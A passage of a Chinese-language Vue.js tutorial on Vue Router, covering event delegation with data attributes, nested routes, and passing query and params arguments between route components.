class="string">&quot;subitem&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;(c2, index) in c1.categoryChild&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;c2.categoryId&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dl</span> <span class="attr">class</span>=<span class="string">&quot;fore&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;goSearch&quot;</span>&gt;</span>&#123;&#123;c2.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">em</span> <span class="attr">v-for</span>=<span class="string">&quot;(c3, index) in c2.categoryChild&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;c3.categoryId&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;goSearch&quot;</span>&gt;</span>&#123;&#123;c3.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用声明式导航，也要注意<code>click</code>事件不要直接绑定在渲染元素上，要利用事件的委派（冒泡），<code>click</code>事件写在就近的父元素上</p>
<ul>
<li><p>问题1：父元素里除了目标<code>a</code>元素，还有其它元素，怎么确定点击的就是<code>a</code>标签呢</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;all-sort-list2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;goSearch&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>解决方案：利用自定义属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;all-sort-list2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;goSearch&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">:data-categoryName</span>=<span class="string">&quot;c1.categoryName&quot;</span>&gt;</span>&#123;&#123;c1.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220623171420245.png" alt="image-20220623171420245"></p>
<p>此时所有的<code>a</code>标签，就有了<code>data-categoryname</code>属性，注意浏览器自动转成了小写</p>
<p>利用<code>event.target</code>获取到所有的子节点，然后带有<code>data-categoryName</code>属性的节点一定是<code>a</code>标签</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> element = event.<span class="property">target</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220623172732461.png" alt="image-20220623172732461"></p>
<p>那么，怎么拿到节点属性呢？使用<code>dataset</code>属性，可以获取到节点的属性和自定义属性，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dataset = event.<span class="property">target</span>.<span class="property">dataset</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dataset)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220623172823730.png" alt="image-20220623172823730"></p>
<p>这是一个对象，解构赋值获取到即可</p>
</li>
</ul>
</li>
<li><p>问题2：点击时要路由传参，怎么获得<code>v-for</code>的参数呢</p>
<ul>
<li><p>可以再给不同级别的绑定另外的自定义属性，<code>category1id</code>、<code>category2id</code>、<code>category3id</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:data-categoryName</span>=<span class="string">&quot;c1.categoryName&quot;</span> <span class="attr">:data-category1id</span>=<span class="string">&quot;c1.categoryId&quot;</span>&gt;</span>&#123;&#123;c1.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:data-categoryName</span>=<span class="string">&quot;c2.categoryName&quot;</span> <span class="attr">:data-category2id</span>=<span class="string">&quot;c2.categoryId&quot;</span>&gt;</span>&#123;&#123;c2.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:data-categoryName</span>=<span class="string">&quot;c3.categoryName&quot;</span> <span class="attr">:data-category3id</span>=<span class="string">&quot;c3.categoryId&quot;</span>&gt;</span>&#123;&#123;c3.categoryName&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跳转的方法中，进行参数获取，并合并</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解构赋值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>router-view</code>：指定组件的呈现位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;nav&gt;</span><br><span class="line">      &lt;router-link to=&quot;/&quot;&gt;Home&lt;/router-link&gt; |</span><br><span class="line">      &lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;router-view/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用注意：</p>
<ul>
<li>目录<ul>
<li>由路由器管理的组件称为路由组件，一般放在<code>src/pages</code>目录</li>
<li>而之前的<code>components</code>文件夹，一般放一般组件</li>
</ul>
</li>
<li>不用的路由组件，其实是被销毁了，可以用<code>beforeDestroy</code>钩子验证；刚出来的路由组件，又会被重新挂载，可以用<code>mounted</code>钩子验证</li>
<li>路由组件的实例身上，会多出<code>$route</code>和<code>$router</code>对象<ul>
<li><code>$route</code>对应单个路由组件的信息，包含了配置的<code>path</code>等信息</li>
<li><code>$router</code>对应整个应用的路由器，只有一个，可以通过组件的<code>$router</code>属性获取到</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="6-3-嵌套（多级）路由"><a href="#6-3-嵌套（多级）路由" class="headerlink" title="6.3.嵌套（多级）路由"></a>6.3.嵌套（多级）路由</h2><p>使用<code>children</code>实现多级路由</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">HomeView</span> <span class="keyword">from</span> <span class="string">&#x27;../views/HomeView.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">News</span> <span class="keyword">from</span> <span class="string">&#x27;../views/News.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Message</span> <span class="keyword">from</span> <span class="string">&#x27;../views/Message.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>) <span class="comment">// Vue实例对象上，会多出一个$store对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [ <span class="comment">// 配置路径和组件的对应关系</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">HomeView</span>,</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="string">&#x27;../views/AboutView.vue&#x27;</span>),</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>, <span class="comment">// 多级路由的path，不用再加/符号了</span></span><br><span class="line">            <span class="attr">component</span>: <span class="title class_">News</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>: <span class="title class_">Message</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/about/news&quot;&gt;news&lt;/router-link&gt;&lt;br/&gt; &lt;!-- 写路径时，要带着父亲的路径--&gt;</span><br><span class="line">&lt;router-link to=&quot;/about/message&quot;&gt;message&lt;/router-link&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt; &lt;!-- 子路由由再写一个router-veiw --&gt;</span><br></pre></td></tr></table></figure>



<h2 id="6-4-路由传参"><a href="#6-4-路由传参" class="headerlink" title="6.4.路由传参"></a>6.4.路由传参</h2><h3 id="6-4-1-query参数"><a href="#6-4-1-query参数" class="headerlink" title="6.4.1.query参数"></a>6.4.1.<code>query</code>参数</h3><h4 id="6-4-1-1-字符串写法"><a href="#6-4-1-1-字符串写法" class="headerlink" title="6.4.1.1.字符串写法"></a>6.4.1.1.字符串写法</h4><p>我们再给<code>Message</code>组件嵌套一层路由</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;Message&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Message</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>: <span class="title class_">Detail</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义<code>Detail</code>组件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li&gt;消息编号：？？？&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;消息标题：？？？&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;Detail&quot;,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>Message</code>组件中使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;Message&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;</span><br><span class="line">        &lt;router-link to=&#x27;/about/message/detail&#x27;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;Message&quot;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                messageList: [</span><br><span class="line">                    &#123;id:&#x27;001&#x27;,title:&#x27;message 01&#x27;&#125;,</span><br><span class="line">                    &#123;id:&#x27;002&#x27;,title:&#x27;message 02&#x27;&#125;,</span><br><span class="line">                    &#123;id:&#x27;003&#x27;,title:&#x27;message 03&#x27;&#125;,</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220602062419576.png" alt="image-20220602062419576"></p>
<p>现在不管是点<code>message01</code>，还是<code>message02</code>，路由一直是<code>detail</code>，内容也不会发生变化</p>
<p>我们希望，在路由跳转的时候，可以传递参数，并且将我们传递的参数展示出来</p>
<p>跳转路由的可以携带两种参数（<code>query</code>和<code>params</code>参数）</p>
<ul>
<li><p><code>Detail</code>组件挂载时，我们打印一下<code>$route</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220602062743888.png" alt="image-20220602062743888"></p>
<ul>
<li><code>query</code>参数，在<code>route</code>对象身上</li>
</ul>
</li>
</ul>
<p>我们改写下<code>&lt;Message&gt;</code>组件的<code>&lt;router-link</code>中的<code>to</code>的写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/about/message/detail?id=666&amp;title=hello&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p>此时<code>query</code>属性，会添加我们写的路径的查询参数（转为对象的形式）：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220602063217057.png" alt="image-20220602063217057"></p>
<p>很明显，我们不能写死，我们使用单向绑定，结合模板字符串，将<code>Message</code>组件中的数据，作为参数传递给<code>Detail</code>组件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;`/about/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p><code>Detail</code>组件中，利用<code>query</code>属性接收相应的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li&gt;消息编号：&#123;&#123;$route.query.id&#125;&#125;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;消息标题：&#123;&#123;$route.query.title&#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220602063731145.png" alt="image-20220602063731145"></p>
<p>但是，上面的写法太恶心，有简易写法</p>
<h4 id="6-4-1-2-对象写法"><a href="#6-4-1-2-对象写法" class="headerlink" title="6.4.1.2.对象写法"></a>6.4.1.2.对象写法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123;</span><br><span class="line">    path: &#x27;/about/message/detail&#x27;,</span><br><span class="line">    query: &#123;</span><br><span class="line">        id: m.id,</span><br><span class="line">        title: m.title</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<h4 id="6-4-1-3-命名路由"><a href="#6-4-1-3-命名路由" class="headerlink" title="6.4.1.3.命名路由"></a>6.4.1.3.命名路由</h4><p>给路由起个名字，使用<code>name</code>配置项</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;guanyu&#x27;</span>, <span class="comment">// 使用name配置项，给路由起个名字</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="string">&#x27;../views/AboutView.vue&#x27;</span>),</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;xinwen&#x27;</span></span><br><span class="line">            <span class="attr">path</span>: <span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>: <span class="title class_">News</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&#x27;Message&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>: <span class="title class_">Message</span>,</span><br><span class="line">            <span class="attr">children</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span></span><br><span class="line">                    <span class="attr">path</span>: <span class="string">&#x27;detail&#x27;</span>,</span><br><span class="line">                    <span class="attr">component</span>: <span class="title class_">Detail</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那有啥用呢？</p>
<p>我们之前使用<code>to</code>的对象写法时，一层层路径，写法还是有些繁琐，配置了<code>name</code>之后，就可以直接写<code>name</code>值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123;</span><br><span class="line">    name: &#x27;xiangqing&#x27;, // 写法上，不再根据path去匹配路径</span><br><span class="line">    query: &#123;</span><br><span class="line">        id: m.id,</span><br><span class="line">        title: m.title</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p>同理，一级路由也可以是如下写法（注意要加冒号），但没必要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;guanyu&#x27;&#125;&quot;&gt;About&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<h3 id="6-4-2-params参数"><a href="#6-4-2-params参数" class="headerlink" title="6.4.2.params参数"></a>6.4.2.<code>params</code>参数</h3><h4 id="6-4-2-1-字符串写法"><a href="#6-4-2-1-字符串写法" class="headerlink" title="6.4.2.1.字符串写法"></a>6.4.2.1.字符串写法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;`/about/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p>同时使用占位符，配置<code>detail</code>组件<code>path</code>项</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>, <span class="comment">//配置path项</span></span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Detail</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>并在<code>Detail</code>组件中，使用<code>params</code>取数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;消息编号：&#123;&#123;$route.params.id&#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;消息标题：&#123;&#123;$route.params.title&#125;&#125;&lt;/li&gt;</span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220603144621235.png" alt="image-20220603144621235"></p>
<h4 id="6-4-2-2-对象写法"><a href="#6-4-2-2-对象写法" class="headerlink" title="6.4.2.2.对象写法"></a>6.4.2.2.对象写法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123;</span><br><span class="line">   name: &#x27;xiangqing&#x27;,</span><br><span class="line">   params: &#123; // 修改key为params</span><br><span class="line">       id: m.id,</span><br><span class="line">       title: m.title</span><br><span class="line">   &#125;</span><br><span class="line">&#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<p>注意，如果是<code>params</code>的对象写法，只能用<code>name</code>，不能用<code>path</code></p>
<h3 id="6-4-3-路由的props配置"><a href="#6-4-3-路由的props配置" class="headerlink" title="6.4.3.路由的props配置"></a>6.4.3.路由的<code>props</code>配置</h3><p>我们在<code>Detail</code>组件中，可以通过<code>$route.params.id</code>拿到路由的位置参数，但是每拿一次都要写这么多，虽然可以通过计算属性来封装，但还是有些麻烦</p>
<p>可以通过路由的<code>props</code>配置项，让路由组件更方便的收到参数</p>
<h4 id="6-4-3-1-props值是对象"><a href="#6-4-3-1-props值是对象" class="headerlink" title="6.4.3.1.props值是对象"></a>6.4.3.1.<code>props</code>值是对象</h4><p><code>router/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">        <span class="attr">props</span>: &#123;<span class="attr">id</span>:<span class="number">666</span>&#125; <span class="comment">// props值是对象，该对象中所有key-value的组合最终都会通过props传给Detail组件，Detail组件通过props配置项获取，这样不用引入`$route`了</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail.vue</code></p>
